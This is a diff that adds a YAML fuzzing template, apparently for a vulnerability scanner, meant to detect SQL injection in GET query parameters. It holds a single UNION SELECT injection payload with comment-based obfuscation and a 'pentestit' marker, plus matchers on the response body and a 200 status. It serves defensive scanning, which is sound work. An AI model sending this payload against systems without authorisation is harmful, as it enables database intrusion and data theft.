@@ -1,0 +1,47 @@
+id: fuzz-sqli-union-select
+
+info:
+  name: SQL Injection Union Select Detection
+  author: netbaan
+  severity: high
+  description: |
+    This template is designed to detect SQL Injection vulnerabilities using a union select payload.
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'  # Run only on GET requests
+
+    payloads:
+      sqli:
+        - "[\"1807192982'\\') union/**/select/**/1,/**/2,/**/3,/**/4,/**/5,/**/6,/**/7,/**/8,/**/9,/**/\\'pentestit\\',/**/11#\"]"
+
+    stop-at-first-match: true
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{sqli}}"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "1"
+          - "2"
+          - "3"
+          - "4"
+          - "5"
+          - "6"
+          - "7"
+          - "8"
+          - "9"
+          - "pentestit"
+
+      - type: status
+        status:
+          - 200  # Expecting a successful response that indicates a potential vulnerability
